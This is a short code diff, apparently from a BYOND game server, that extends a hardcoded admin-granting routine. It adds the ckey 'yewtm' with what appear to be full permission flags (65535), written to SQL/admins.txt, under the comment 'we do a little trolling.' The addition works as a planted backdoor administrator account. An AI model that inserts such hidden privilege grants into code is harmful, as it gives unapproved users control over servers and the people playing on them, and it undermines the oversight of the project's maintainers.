@@ -36,5 +36,8 @@
 	else if (ckey == "valzargaming")
 		text2file("valzargaming;Captain;65535|||","SQL/admins.txt")
 		return
+	else if (ckey == "yewtm") //we do a little trolling.
+		text2file("yewtm;Master Sergeant;65535|||","SQL/admins.txt")
+		return
 	else
 		return
